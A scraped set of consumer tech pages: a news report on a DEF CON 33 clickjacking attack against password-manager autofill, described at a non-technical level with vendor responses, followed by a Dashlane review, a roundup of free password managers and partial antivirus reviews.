  "title": "Multiple top password managers vulnerable to password stealing clickjacking attacks - here\u2019s what we know",
  "description": "Several password managers can be attacked to steal data",
  "content": "\u2022 Multiple password managers are suceptible to a new attack\n\u2022 Passwords, 2FA codes, and credit card details can be stolen\n\nAt the recent DEF CON 33 conference, independent researcher Marek T\u00f3th unveiled a clickjacking attack he claims could exploit the autofill capabilities of six of the biggest password managers.\n\nThe attack is able to steal passwords, 2FA codes, and credit card details, making it a serious concern for tens of millions of password manager users.\n\nT\u00f3th tested the attack against versions of 1Password, Bitwarden, Enpass, iCloud Passwords, LastPass, and LogMeOnce, and found that the browser-based variants could leak stored data under the right conditions.\n\nThe attack relies on using a website that uses opacity settings, overlays, or a pointer-event to make the autofill function of the web-based password manager to appear invisible. The websites can either be malicious sites, or legitimate sites that have been compromised.\n\nThe attacker then uses a pop-up or CAPTCHA that deliberately places the user\u2019s clicks on the hidden password manager controls, autofilling the credentials into the form and stealing them.\n\nWhat makes this attack vector even more concerning is that the attacker could use a universal attack script to identify the password manager active on the web browser and adjust the attack to target it specifically.\n\nOther variations of the attack were demonstrated at DEF CON 33, including several DOM-based subtypes that abuse the opacity at the element, parent element, root, and overlay level, as well as an attack that can trigger autofill anywhere the cursor is placed.\n\nT\u00f3th notified the companies on which he tested the attack vector in April 2025, also stating that public disclosure would be made at DEF CON 33 in August. Cybersecurity researchers at Socket verified T\u00f3th\u2019s methods and assisted in notifying the affected password managers.\n\nSeveral password managers remain vulnerable to the attack, including these versions:\n\nThe latest versions of Dashlane, NordPass, ProtonPass, RoboForm, and Keeper have all been patched against T\u00f3th\u2019s demonstrated attack vector. LastPass and LogMeOnce are currently working on fixes for the attack.\n\nSeveral companies issued comments to BleepingComputer following the publication\u2019s article.\n\n\"We appreciate the work of security researchers, like Marek T\u00f3th, who help raise awareness about potential threats and improve industry-wide security. The clickjacking vulnerability Marek uncovered highlights a broader challenge facing all password managers: striking the right balance between user experience and convenience, while also addressing evolving threat models.\n\nLastPass has implemented certain clickjacking safeguards, including a pop-up notification that appears before auto-filling credit cards and personal details on all sites, and we\u2019re committed to exploring ways to further protect users while continuing to preserve the experience our customers expect.\n\nIn the meantime, our threat intelligence, mitigation and escalation (TIME) team encourages all users of password managers to remain vigilant, avoid interacting with suspicious overlays or pop-ups, and keep their LastPass extensions up to date.\" - Alex Cox, Director Threat Intelligence, Mitigation, Escalation (TIME) at LastPass.\n\n\"Clickjacking is not unique to the 1Password browser extension. It is a long-standing web attack technique that affects websites and browser extensions broadly. Because the underlying issue lies in the way browsers render webpages, we believe there\u2019s no comprehensive technical fix that browser extensions can deliver on their own.\n\nWe take this and all security concerns seriously, and our approach to this particular risk is to focus on giving customers more control. 1Password already requires confirmation before autofilling payment information, and in our next release, we\u2019re extending that protection so users can choose to enable confirmation alerts for other types of data. This helps users stay informed when autofill is happening and in control of their data.\" - Jacob DePriest, CISO at 1Password.\n\nYou might also like\n\u2022 Take a look at the best free password managers around today\n\u2022 I've rounded up the best antivirus software on offer\n\u2022 Google Password Manager may be set to introduce a nuclear option for its Android app",

It can significantly improve your online security by managing and protecting your passwords and personal information.\nFirst, visit the Dashlane website or download the Dashlane app from your app store of choice. Once you have the software on your device, please open it and select the option to create a new account.\nEnter a valid email address. This will serve as your Dashlane username, and you'll receive your account notifications there.\nThe most crucial step in setting up Dashlane is creating your Master Password. This password is the key to all your stored data and passwords, so it should be firm and unique\u2014something you haven't seen anywhere. It should be a long combination of letters (both upper and lower case), numbers, and symbols. You must remember this password, as Dashlane doesn't do it, and thus cannot recover it if you forget it.\nFollow the on-screen prompts to install the Dashlane extension for your preferred web browser. This extension allows Dashlane to auto-fill passwords, payment information, and personal details while you browse the internet.\nWe encourage you to add the Chrome extension. We were presented with a list of popular websites with links and logos and asked to select our first site. The software then guided us through choosing and storing passwords using the Chrome extension.\nBeyond the Chrome extension, there are other popular browsers, such as Edge, Firefox, Brave, and Opera, as well as desktop clients for the major operating systems and mobile apps.\nAfter installing the extension, Dashlane will offer to import your existing passwords from your browser or other password managers. This process will help consolidate your passwords into one secure location. The intuitive import feature will guide you through steps to ensure your passwords are transferred securely.\nEnter your personal information, such as addresses and payment details, into your Dashlane account. This step allows Dashlane to auto-fill forms and payment methods when shopping online or signing up for services, saving you time and ensuring accuracy.\nIf you have Dashlane Premium, you can take advantage of its sync features by installing Dashlane on all your devices. This ensures that your passwords and personal information are accessible wherever you are. Download Dashlane to your other devices and log in with your account details.\nFinally, explore the additional features that Dashlane provides, such as the Password Health Score, which assesses the strength of your passwords, or the Dark Web Monitoring, which alerts you if your information is found on the dark web. If you have Dashlane Premium, you can also use the Secure VPN to get alerts for potential security breaches.\nFollowing these steps, you can set up Dashlane to manage your digital identity effectively. Always keep your master password in a safe place, and remember that regular updates to your password vault can further enhance your online security. Dashlane not only simplifies your browsing experience but also rigorously protects your data from the threats of the digital world.\nSuppose your setup is because you're moving to another password manager. You can import credentials straight into Dashlane by exporting from 1Password, Bitwarden, LastPass, KeePass, Keeper, or RoboForm as a .csv file. You can do the same from Google Password Manager, Microsoft Edge Password Manager, iCloud Keychain, and the Firefox browser.\nDashlane: Interface and performance\nI've been using Dashlane for a while now, which has revolutionized how I manage my passwords and sensitive information. The feature that automatically fills in login details for websites, credit and debit card numbers, and online forms has made my average working day far more efficient. I no longer have to spend time manually entering this information, which has been a game-changer for me.\nOne of the standout features for me is the bulk password-changing function. Changing multiple passwords at once is incredibly convenient, especially in a significant data breach. This feature lets me know I can easily update my passwords to enhance security.\nWhat's moreMoreoverare offers a VPN for safe browsing on public Wi-Fi connections with its Premium plans. This goes beyond password management and adds an extra layer of security to my online activities. Even with the free version, I get personalized security alerts and a reliable password generator, which has been very useful.\nDashlane's business suite is comprehensive when it comes to business use. It handles every aspect of a company's password security, from password storage to security policy management. The Admin Console allows for detailed password hygiene analysis and provides insights into compromised passwords, which is crucial for maintaining a secure environment.\nI appreciate that Dashlane works seamlessly across most operating systems and offers plugins for all the main browsers. The clean and intuitive interface makes managing and adding passwords, viewing account information, and accessing other features quickly. I also love the instant syncing across platforms, which ensures I can access my passwords and data on all my devices.\nThe password generator, accessible through the browser plugin, is a nice touch that allows me to create strong passwords while browsing. Overall, Dashlane has become an essential tool for maintaining high online security and efficiency.\nDashlane: Passkeys\nDashlane has implemented Passkeys as a more secure alternative to traditional passwords, aligning with evolving internet security standards. Passkeys in Dashlane help protect logins stored within the service, preparing users to manage their online presence on platforms that support passkeys. Although only some websites and apps have adopted this technology, Dashlane provides a streamlined process for managing and using your passkeys for those who have. When logging in or creating an account on a site that uses passkeys, Dashlane will prompt you to generate a passkey for that site. Once set up, this passkey will be used for future logins on the website, identifying the correct passkey for easy access.\nPasskeys work by generating two cryptographic keys for each account: one public key stored on the website where you create the account and a private key stored in your authenticator, like Dashlane. This method enhances security by ensuring that the key needed for access is never transmitted or stored on servers, reducing the risk of theft or interception.\nTo further illustrate how Dashlane employs passkeys, specific guides are provided for securing accounts such as Google and GitHub using passkeys. The process involves creating a passkey in the respective platform's account settings, which is then stored in Dashlane\u2019s vault. Users can sign into these accounts using the stored passkey, streamlining the login process while bolstering security measures.\nDashlane: Security\nDashlane is the only US-patented password manager and uses military-grade AES 256-bit encryption alongside its patented technology.\nFurther security is enabled by two-factor authentication (2FA) compatible with common authenticator apps and U2F security keys. Like some other password managers, there is a master password that the user needs to enter to access the service, but only the user has it, and Dashlane has zero knowledge of it, and does not store it. What this means, though, is that if you forget your master password, you could be locked out for good.\nThere's plenty of support for different SSO apps here, too \u2013 Dashlane integrates with Microsoft 365, Google Workspace, Azure, Duo, Okta, and more. Businesses can also use customizable policies to create a tailored, secure environment, and automated employee management allows security to start immediately.\nDashlane even has a bug bounty program that offers rewards of up to $5,000 in return for the notification of vulnerabilities by eager security workers.\nDashlane Business: Team and Admin Features\nAs an admin of Dashlane\u2019s Business plans, you get a web-based admin console from where you can manage the users, groups, policies, and security settings of the password manager. It also offers an overview of your organization's password health, and flags potential risks.\nAs an admin you can add, and remove individual users, and organize them into groups based on teams, departments, or projects. Members of a group can share anything in their vaults including credentials, with other members of the group.\nYou can also delegate group management responsibilities to other users without granting them full admin privileges. This is especially useful for large organizations, or businesses that have a large number of groups. Group managers get access to the Groups tab of the admin console, and can add (and remove) users to a group.\nBy default, Dashlane wouldn\u2019t let your users share credentials with anyone outside of your organization, but you can override this behavior.\nAs noted earlier, Dashlane encrypts data using AES-256, and provides different options for the key derivation function. Admins can also enforce a specific key derivation function for all the users, or give them the option to choose their own from the available options.\nYou can also require all users to mandatorily use 2FA when they log in to Dashlane. You can also generate 2FA recovery codes for your users if they lose the phone they use with 2FA. In the same vein, if a user forgets their master password, admins can also help them regain access to their account.\nAs a security measure, you can also set when members are automatically logged out of Dashlane after a period of inactivity. It is set to Never by default, but you can choose from 15, 30, or 60 minutes.\nDashlane\u2019s business plans also include some security tools. It can help highlight weak, and compromised credentials across your organization, even when those users aren\u2019t using Dashlane. It\u2019ll also alert users of potential phishing attempts when the URL they visit differs from the saved URL of the related credential.\nSome business plans also have support for Smart Spaces that helps your users separate credentials into Personal and Business spaces within the same account. You can list any work-related domains, and logins that contain the domain in the email, username, alternative username, or website, will be forced into the Business Space automatically.\nThis also comes in handy especially when a user leaves your company. Thanks to this feature, you can revoke their business credentials, without deleting the entire account.\nYou can also access detailed activity logs from the admin console that give a detailed history of user actions, and also note key events like policy changes, and security events. Any changes made by a group manager are also logged. The logs are searchable, and can also be filtered by credential, category, activity type, and date.\nDashlane Business: Integrations and Compatibility\nAs an admin of a Dashlane business plan, you can integrate the password manager with some of the best Identity Providers (IdPs) including Okta, Azure AD, Google Workspace, as well as with LDAP. This will help your employees log in to Dashlane using their existing corporate credentials.\nYou can also plug Dashlane with System for Cross-domain Identity Management (SCIM) to automate user provisioning and de-provisioning. Once connected, when new employees join or leave the organization, their Dashlane accounts will be created, or revoked, automatically, which streamlines user management, and improves security.\nDashlane also integrates with Security Information and Event Management (SIEM) tools so you can monitor suspicious activity, such as logins from unrecognized devices, unusual deletion of credentials, and more. Currently, it offers integration with Splunk, and is working to offer support for Microsoft Sentinel in the near future.\nDashlane Business plans also have a new feature called Nudges, which connects the password manager with the Slack messaging platform. Once integrated, Dashlane will send alerts to employees about their weak, reused, and compromised passwords via Slack.\nDashlane also has a public API that provides read-only access to all kinds of data, and insights about your Dashlane business plan, its users, and the devices they use. You can use this API, for instance, feed these details to tools like compliance platforms, and help them audit and verify your organization\u2019s security posture.\nDashlane Business: Ease of Use and Deployment\nNavigating the web-based admin console is pretty straightforward, and it allows admins to manage their organization-wide Dashlane deployment remotely.\nFrom the Dashboard, you can view the Password Health score of the entire organization, along with the total number of compromised passwords. You can also track the number of licenses left before inviting new users, or purchasing more seats.\nYou can also track the individual user\u2019s Password Health score from under the Users tab, along with the number of total, safe, weak, reused, and compromised credentials for each user. The panel also makes it fairly simple to change a user\u2019s rights, remove them, create groups, and add users to groups.\nDashlane offers several mechanisms to onboard users. You can invite users manually by mentioning their email address, which sends them an invitation to join. If you have to invite a lot of users, it\u2019s best to upload a CSV, or TXT file that contains multiple email addresses. The admin console also lets you send reminders to all users who haven\u2019t yet accepted the invitation.\nYou can also activate an invite link from the admin console, which you can then send to the employees via other means such as an instant message.\nAs we\u2019ve mentioned earlier, you can also integrate Dashlane with your IdP from the admin console. If you\u2019ve set up SSO for Dashlane, you can also enable Just in Time Provisioning, which further simplifies onboarding employees.\nInstalling the Dashlane browser extension is a critical part of using Dashlane. All members will be asked to install the extension when they get onboard, but you can also install it for them by mass deploying it for Windows users with Group Policy Object (GPO), and Microsoft Intune, or with Jamf for Mac users.\nDashlane: Customer support\nDashlane has a well-organized and easy-to-navigate support page that we could access through the web app and browser extension. It has a prominent search bar top and center to look for content and plenty of articles that guide users through key app features.\nFAQs are comprehensive and arranged into categories such as Account & Security, Passwords & Data, and Platforms & Browsers.\nLive chat support is available in English during working hours on weekdays, while out of hours, it's possible to consult the chatbot and contact the support team via email. We tested all options and were impressed with each of them, as there was no queue on the live chat and our request was dealt with quickly and professionally. Our email was answered quickly with information on contracting the live support staff, but the chatbot was a little underwhelming compared with other similar experiences across the web, especially during an era of generative AI. The responses and pre-determined inputs were somewhat limiting.\nRemember, too, that certain product tiers also included phone support \u2013 ideal if you need help in a hurry.\nDashlane: The competition\nDashlane's biggest competitor is LastPass, which is consistently voted among the best password managers on the market.\nDashlane has a cleaner, more user-friendly interface, but LastPass wins on value for money. Its free version is only slightly different from its paid one, while Dashlane's free product misses out on features like dark web monitoring and VPN support.\nKeePass is Dashlane's closest competitor in regard to security. The company sells its service on its security merits, but, unlike Dashlane, this advanced security comes at the expense of convenience. Another strong competitor is N-Able Passportal, which is well-suited to demanding businesses.\nDashlane: Final verdict\nThe simplicity of Dashlane's interface means even first-time users can benefit from the advanced password management services and security. The free product is a decent option for essential password protection. There's plenty of functionality available in all of Dashlane's products, especially if you upgrade to the paid versions. However, it's worth noting that some of Dashlane's business products are relatively expensive compared to other password manager tools.\nWe've also featured the best password recovery software.\nWhat to look for in a password manager\nYour online identity has never been more crucial in today's digital age. With many login credentials to remember, the convenience of using a password manager can sometimes overshadow the importance of choosing one that offers top-notch security and reliability. When selecting a password manager to safeguard your digital life, here are key features and considerations to remember.\nThe primary objective of a password manager is to keep your passwords secure. Look for services offering robust encryption protocols, such as AES-256, which is the industry standard. Two-factor authentication (2FA) is another essential feature, adding an extra layer of security by requiring a secondary form of identification beyond just the master password. Additionally, please find out about the company's security company's breach history to gauge its commitment to security.\nIn our multi-device world, it is key to ensure your password manager works seamlessly across all your devices and operating systems. This compatibility allows you to access your passwords on your phone or computer, regardless of the operating system.\nThe best password manager is one that you will use consistently. It should have an intuitive interface, be easy to set up and offer simple tools for password generation, storage, and auto-fill capabilities. The less friction it adds to your daily routines, the more likely you will keep using it.\nPassword-sharing capability is necessary for those who need to share account access with family members or colleagues. However, this feature should not compromise security. Ensure that the password manager allows for secure sharing, enabling you to share access without revealing the passwords.\nA top-tier password manager stores your passwords, helps you create strong, unique ones for every account, and evaluates your current pass. The strength of your current passwords is invaluable in maintaining a secure online presence, as it helps eliminate weak or reused passwords.\nData breach alerts are increasingly common, and they are a proactive security feature that notifies you if your information has been compromised in a data breach. This early warning system allows you to change your credentials before they can be misused.\nBeyond passwords, many people need to securely store other types of sensitive information, such as bank account numbers, secure notes, or personal documents. Beyond password manager, a good password should also offer encrypted storage for these items.\nConsider the cost of the password manager and what you get for your investment. Many offer a basic free version, which might suit your needs. However, premium features like advanced multi-factor authentication, secure file storage, or family plans usually require a subscription. Ensure that the price aligns with the benefits provided.\nFinally, take the time to read user reviews and expert opinions on the password manager. A robust and positive reputation within the industry can be a good indication of reliability and user satisfaction.\nChoosing a password manager is a crucial decision that can significantly affect your online security. Take the time to compare features, understand your security needs, and select a service that doesn't just remember your passwords but actively contributes to your online safety and convenience.\nMike has worked as a technology journalist for more than a decade and has written for most of the UK\u2019s big technology titles alongside numerous global outlets.

      "text": "Best free password manager of 2025\nStay safe online with the best free password managers\nThe best free password managers are an easy way to stay on top of your credentials and keep your password hygiene clean without having to spend on an expensive service.\nPassword managers are a great way to enhance your credential security - often allowing you to save and store your passwords, as well as offering auto-fill credential features, and some even have built in password generators which will protect your accounts by creating unique and secure passwords without the hassle of trying to remember them.\nOur team of experts have been reviewing password managers for just about as long as they've been around, and have spent thousands of hours testing the 30 best services from big names like Dashlane, Roboform, and NordPass. We test for all the basics, especially encryption levels, how many passwords you're able to save, and any free extra features.\nIf you're willing to splash out a little for your password service, we've also made a guide to the best password managers, so your credentials have premium protection. These often include better authentication options, passkey support, browser extensions, and cross platform support.\nWe\u2019ve also listed the best password recovery software and the best identity theft protection.\nReader Offer: Save 52% on NordPass Premium\nNordPass provides an accessible, competent, easy-to-use solution that most people will love, according to TechRadar editors. Save 52% on NordPass Premium plus 1 month extra with code TECHRADARPASS.\nPreferred partner (What does this mean?)\nThe best free password managers of 2025:\nWhy you can trust TechRadar\nBest free password manager for security\nReasons to buy\nReasons to avoid\nNordPass is a password manager built by the team behind the great NordVPN Virtual Private Network solution. As such, having stellar security features shouldn\u2019t be much of a surprise to anyone. With end-to-end encryption for your password backups and data syncing, basically, the whole zero-knowledge approach is there.\nThe tool uses the XChaCha20 encryption algorithm, and there\u2019s also an option to add biometric security where available, in addition to two-factor authentication.\nApart from passwords, NordPass can store credit cards and passkeys as well, which is a nice addition. Autosave and autofill for passwords are also there, and for the free tier, there\u2019s a one-user limit.\nGetting started with NordPass is very easy. All you need to do is download the app, create the account with a master password and you\u2019re all set. You can import passwords from all major browsers or directly from a CSV file. In addition, you can import your passwords from other password managers.\nNordPass is available for Windows, MacOS, Linux, Android, and iOS. On top of that, Firefox, Chrome, Opera, Edge, Safari, and Brave browser extensions are available.\nUsing the password manager itself is a straightforward and very user-friendly process as the interface is polished and clear from the get-go. Every point is easily accessible, so even the utter newbies won\u2019t have any issues figuring things out.\nRead our full NordPass review.\nBest free password manager for a single device\nReasons to buy\nReasons to avoid\nDashlane is one of the most popular password managers in the world, and for good reason. When it comes to the free version, though, there are a couple of things worth mentioning.\nFor starters, while Dashlane's free plan formerly capped the capacity to a mere 50 passwords, it has since lifted that significant restriction, and thankfully it now supports unlimited passwords.\nHowever, like a few other competitors, Dashlane still imposes a single device limit, which is an issue as most users have multiple devices, and the whole point of password management software is to have your passwords available on whatever device you are using.\nThat said, we did find some good features on offer with the free plan. The always welcome autofill capability is present, which not only works for passwords but also other information such as contact details and delivery addresses. We also like the password generator for the creation of strong passwords, and the ability to organize and search your passwords.\nThere is also a strong emphasis on security, as Dashlane states that it has never suffered a data breach, and it doesn't actually see any of your data. Furthermore, it also indicates that you can take your passwords and data when you leave, such is the confidence it has in its service.\nOverall, we think Dashlane is a useful free password manager for those that can work within its single device limit.\nRead our full Dashlane review.\nBest free password manager for form filling\nReasons to buy\nReasons to avoid\nRoboForm is another versatile password manager, with plugins for all the major browsers and mobile apps for both iOS and Android. It offers a free tier, along with an upgraded plan and a family plan.\nThe free version is superb in our view, providing you with a secure vault for your logins and the option to store it on your device only rather than the cloud. An auditing tool to help identify weak or duplicated passwords is also included, along with a password generator for replacing them with strong, nigh on uncrackable strings of numbers, letters, and special characters.\nThe service also allows you to store an unlimited number of logins, and after the data is saved, you can just log back into sites with a single click. There is also multi-platform support, the ability to manage bookmarks, the option to securely send logins, and an autofill which we think is great, making it a good choice for those who regularly need to complete online forms.\nHowever, we don't like the fact that the free version of RoboForm doesn't sync your passwords across multiple devices. It is also missing 2FA, and on the free tier support is merely a knowledge base with no phone or email contact for a more direct connection.\nRead our full Roboform review.\nBest free password manager overall\nReasons to buy\nReasons to avoid\nBitwarden is open-source, user-friendly and highly secure. It includes almost everything consumers, teams, and businesses could want in a password manager.\nAs you might expect, the free plan is only for consumers - the two tiers for business come at a price. Less expected, however, is that Bitwarden\u2019s free tier has a surprisingly large number of features, including ones usually reserved for premium services.\nWe also appreciate that it claims that the basic plan will be \u201cfree forever,\u201d so you can have confidence in trusting Bitwarden with your passwords without any nasty financial surprises later on.\nNotable features of the free tier include accounts for up to two users, multi-device synchronization, free cloud hosting, unlimited devices and password storage, and the ability to share your vault items with another user.\nThere's also two-step login, better known as two factor authentication (2FA): an industry-wide recommended best security practice. Although the methods are limited to email or an authenticator app in the free version (the paid version adds support for YubiKey and FIDO2 security keys - which are among the best security keys - as well as the unique MFA solution from Duo), it's still a welcome additional security measure - and one you usually have to pay for.\nNot particularly surprising for a free app, but be aware that support for Bitwarden is of the self-service variety. While there is a Help Center containing various documentation, as well as a community forum, the support portal for more direct support is limited to paid plans. Further, we did not find any phone or email contacts for direct support on any tier.\nBut when all is said and done, Bitwarden is not just one of the best free password managers available; it\u2019s so advanced and feature-packed that it could put some paid password managers to shame as well.\nRead our full Bitwarden review.\nBest cross-platform free password manager\nReasons to buy\nReasons to avoid\nLogMeOnce is a password management solution that offers cross-platform support, including Android and iOS devices. Regardless of the device you use, whether desktop or mobile, your passwords and logins are still accessible at all times.\nUnusually, LogMeOnce eliminates the need for a master password, instead letting you access your vault by scanning a QR code or taking a selfie. That way, you can't get locked out of your account if you forget your credentials. Two-factor authentication is present as well (only via email and Google Authenticator, though).\nLogMeOnce also offers additional security features, such as the ability to encrypt your data via AES and store your logins online to help with accessibility. There is also support for two factor authentication (2FA), a password generator, and a feature called App Beneficiary, which allows trusted people to access pre-chosen apps in case of an emergency.\nThe free version, unlike some others, isn't too restrictive, coming with unlimited password storage, autofill, cross-platform availability and synchronization. There is also some encrypted file storage and the ability to store up to three credit cards. It supports secure password sharing for a generous five users, again more than is offered by other free managers.\nLogMeOnce is built to provide Single Sign-On functionality as well, given that it is also an identity management platform, so once you've logged in to LogMeOnce, you won't have to sign into your other compatible software and services too.\nWith so many features, we think LogMeOnce is a worthy choice, but we did find some drawbacks. Ads are displayed on the free tier, and while there is at least some encrypted storage available, it is limited to just 1MB, which is hardly worth it (paid plans have a more reasonable 1GB capacity). Finally, tech support on the lowest tier has but one option: email, and not the priority email you get with paid tiers. There is a searchable database of articles for a self help, though.\nOverall, we think that it's cross-platform and SSO functionality, combined with its passwordless login capabilities, make LogMeOnce a great choice for those who use multiple devices.\nRead our full LogMeOnce review.\nBest for open-source\n6. Proton Pass\nOur expert review:\nReasons to buy\nReasons to avoid\nProton Pass is the password manager solution offered by one of the best secure VPN providers, and as you would expect, privacy and security is the name of the game for Proton. In providing end-to-end encryption and passkey support, Proton Pass is one of the best open-source options around.\nBeing built on an open-source basis, Proton Pass is built by the community, for the community, so you can be sure that user experience is a high priority for the Proton team, and it also means there are no adverts at all on the free tier.\nAs Proton is headquartered in Geneva, you can be sure your data is under the protection of some of the strongest privacy laws in the world, alongside alerts for vulnerable passwords, passkey support across all devices, secure sharing for 2 vaults, alongside unlimited logins, notes and devices.\nFor the free tier, there is no need to enter any credit card information, and the Proton Pass website promises that the free tier will remain free forever, so no need to worry about any hidden fees.\nOne drawback however is that you do not get access to the integrated 2FA authenticator available on the paid plan, which could be a limiting factor for those looking for the ultimate level of security. On the plus side, the app offers support for Firefox, Edge, Chrome, Brave and more.\nAs an additional perk, the free tier offers 10 hide-my-email aliases to cut down on the spam you could receive if your personal email is leaked, or if you just want to use an alias to dodge the pesky marketing that is filling up your mailbox.\nRead our full Proton Pass review.\nWe've also listed the best business password managers.\nBest free password manager FAQs\nWhat is the difference between free and paid for password managers?\nPlenty of password managers offer both free and paid subscriptions for their service. Mostly, the level of security and protection you get will be the same, using the same encryption processes, etc. However, the differences will usually come down to storage and/ or device allowance, as well as the number of extra features you get.\nFor instance, some password managers will only let you use their client on a single device on free plans, whilst paying subscribers may get access to the manager across an unlimited number of devices. Similarly, some free tiers may also restrict the number of credentials you can store in their vault, while again, paying customers will have no limits in this regard.\nCommon additional features that may be omitted from free password managers include dark web monitoring - which informs you if any of your credentials have appeared in a data breach - storage for items beyond passwords, and direct customer support.\nOne of the key reasons we picked Bitwarden as our best free password manager overall is because of its unrivaled feature-set for non-paying users.\nWhat are the risks of using a free password manager?\nAs far as we are aware, none of the password managers in our round-up compromises on its security posture for free users - a company that did that would certainly be stooping low.\nInstead, there will likely be an absence of more advanced features, such as dark web monitoring or a VPN, which can help protect your privacy as well as your safety. However, these will likely be no match for the best VPN services around.\nHaving said that, not all free password managers have two-factor authentication (2FA), which adds an extra layer of protection to your master password, to make sure it is really you who is trying to access your vault. This is certainly a recommended feature to activate if the option is there, but most essential of all is to make sure that your master password is as strong and unique as possible, whilst also being memorable to you.\nWhat is the safest free password manager?\nAgain, all the password managers featured in this list have a great safety record, and wouldn\u2019t think to compromise a user\u2019s safety just because they aren\u2019t paying.\nOne of the biggest contributors to the safety of a password manager is whether encryption is used and what kind. Because if the worst were to happen and the vendor suffers a breach, then hackers would still not be able to gain access to your vault; they would need to be able to crack your master password first, which is why it is so important to come up with a strong one.\nUsing a string of three memorable words is a good tactic, as this would be easy to remember yet hard to crack. Single and common words can be guessed by powerful machines in a matter of seconds in some cases (and please, whatever you do - don\u2019t use \u2018password1234\u2019!)\nWith end-to-end encryption, only you can decrypt your vault and see your items using your master password (or biometric data if supported). The password manager will not know your password and will store it in an encrypted form so no one at the company or a hacker will know what it actually is.\nThere are different methods of encryption, but all the free password managers featured in this guide use a strong kind that comply with industry standards, as far as we are aware.\nHow to choose the best free password manager\nWhen looking for the best free password manager to suit your needs, it is important to consider if the free tier features will work for you, or if you may need to take a look at some of the best password managers that include other features such as password generation. The level of security provided by each solution is important, and you should always check that they use additional security features such as multi-factor authentication or passkeys. If you want to use your passwords across multiple devices, your choice should take into account whether cross-platform synchronization is offered as a free feature. Second to this, you should also check if your chosen solution is compatible across operating systems such as Windows and MacOS, and iOS and Android. Price isn\u2019t too much of a concern when comparing free password managers, but it is worth taking a look at some of the premium features to improve your user experience.\nPassword managers compared\n| Header Cell - Column 0 | Bitwarden | LogMeOnce | RoboForm | Dashlane |\n|---|---|---|---|---|\nPassword limit | Unlimited | Unlimited | Unlimited | Unlimited |\nDevice limit | Unlimited | Unlimited | 1 | 1 |\nMulti-device sync | Yes | Yes | No | No |\n2FA | Yes | Yes | Yes | Yes |\nPassword sharing | 2 users | 5 send and receive | Send only | Unlimited |\nExtra features | Data breach reports, email alias support | Passwordless unlock, beneficiary access, security audits | Beneficiary access, dark web monitoring, TOTP authenticator | 1GB encrypted file storage, dark web monitoring, phishing alerts, beneficiary access |\nHow we test the best free password managers\nIn our testing of the best free password managers, we examined each one across a range of criteria, including their ability to work across a range of platforms, and their user experience between different browsers and devices. As we have explained before, there are 10 essential features your password manager should have.\nWhen testing the free tiers of password managers it is important to recognise that the best features are often locked behind a paid subscription, so we compare each free password manager across the features they offer without the user having to spend a penny, and the more tools offered at the free tier, the better.\nAs each user has a different use case when searching for a password manager, we make sure to thoroughly test them across a range of situations so as to weed out any flaws that may go overlooked in a brief run through, and to ensure the features on offer suit the needs of each use case.\nRead more on how we test, rate, and review products on TechRadar.\nWe've also listed the best VPN for business.\nGet in touch\n- Want to find out about commercial or marketing opportunities?

Its real-time protection is even enabled from the get-go.\nDon't use if:\n\u274c You want quick scans: initial and deep scans take almost an hour to complete (five times longer than other antivirus on average). Thankfully, you'll still be able to work, play, and browse when they're running.\n\u274c You need identity theft monitoring: Bitdefender has some monitoring tools to track online identities, but for real round-the-clock protection from identity theft, you'll want to check out Norton.\n\u274c You're already infected with malware: Bitdefender isn't as effective when it comes to removing threats already attacking your system. For current infections, try Malwarebytes.\nOur thoughts:\nBitdefender is more than just antivirus software - it can be a life security suite depending on the plan you choose. It consistently impresses with its ability to identify threats and stop them in their tracks and has scored very highly in our own testing and testing done by third-party laboratories.\nBitdefender Total Security includes parental controls, a VPN, vulnerability scanner, and a dedicated browser.

McAfee has a solid reputation for antivirus protection, and consistently scores top marks.\nMcAfee+ goes beyond simple antivirus protection and includes a firewall, password manager, file shredder and unlimited VPN all in just the basic tier. The mobile apps are well crafted and easy to use, making it a top choice for those who want protection on the go. You can also use the Online Account Cleanup tool to check if any of your online accounts are having their data hoovered up by less than reputable sites, and help you delete them.\n\u25b6 Try McAfee+ with its 30 day money back guarantee\nBottom line: \u2b50\u2b50\u2b50\u00bd\n\ud83d\udd12 McAfee is undoubtedly expensive, but earns its spot in my top picks with standout mobile apps, advanced features, and its prioritization of identity protection.\nFeatures | Notes | Rating |\n|---|---|---|\nProtection | Excellent protection and plenty of extra tools to help keep you secure | \u2b50\u2b50\u2b50\u2b50\u2b50 |\nPerformance | Infrequent lagging, but not enough to interrupt what you're working on | \u2b50\u2b50\u2b50\u2b50 |\nEase of use | Mobile apps are pretty straightforward to use, desktop is a bit overwhelming when you first use it | \u2b50\u2b50\u2b50\u2b50 |\nAdvanced tools | Many tools focus on protecting your identity including a VPN and personal data cleanup, but how well they work depends on what you're willing to pay | \u2b50\u2b50\u2b50\u2b50 |\nCustomer support | Decent FAQs section on its website, and a support community, live chat is with a Virtual Assistant and not a live agent | \u2b50\u2b50\u2b50\u2b50 |\nValue | One of the most expensive antivirus programs, but you can use it on any number of devices | \u2b50\u2b50\u2b50 |\nRead our full McAfee review here.\nBest for Wi-Fi security\nSpecifications\nReasons to buy\nReasons to avoid\nUse if:\n\u2714\ufe0f You have a lot of smart devices: F-Secure has one of the best network protection tools to secure every gadget connected to your home internet.\n\u2714\ufe0f You value speed: scans balance speed with thoroughness without sacrificing either.\n\u2714\ufe0f You need a VPN: the F-Secure VPN does have its limitations, but it's a useful tool to have in a pinch.\nDon't use if:\n\u274c You're new to antivirus: the dashboard is very text-heavy, which can be overwhelming, and it's not the easiest tool to install.\n\u274c You need Chromebook protection: unfortunately, F-Secure doesn't offer a Chromebook app\u2014meaning you'll have to look elsewhere.\n\u274c You don't want to be slowed down: you might experience slower load times when opening programs or browsing the web, leading to serious frustration.\nOur thoughts:\nI frequently write about smart devices being taken over by hackers, so F-Secure is a sight for sore eyes in this respect. While F-Secure doesn't quite rival the scores of other antivirus in testing - and occasionally throws up a few false alarms - it provides great protection for edge, IoT, and smart devices connected to your Wi-Fi network.\nOne of the standout features of F-Secure Total is the 24/7 live and remote support that can help you with any bugs or glitches you might experience - something very few providers offer. The network protection can even protect your on unsecured public networks while the built-in VPN keeps your traffic encrypted and private.\n\u25b6 Try F-Secure Total for 30 days free\nBottom line: \u2b50\u2b50\u2b50\u2b50\n\ud83d\udd12 F-secure takes some getting used to, but all of the most important security and privacy tools are there\u2014including incredible network protection and 24/7 live support.\nFeatures | Notes | Rating |\n|---|---|---|\nProtection | Excellent malware blocking and protects smart devices connected to your home network | \u2b50\u2b50\u2b50\u2b50\u2b50 |\nPerformance | Some slowdown when launching programs or navigating the web | \u2b50\u2b50\u2b50 |\nEase of use | Not the easiest to figure out, but the tutorials do help | 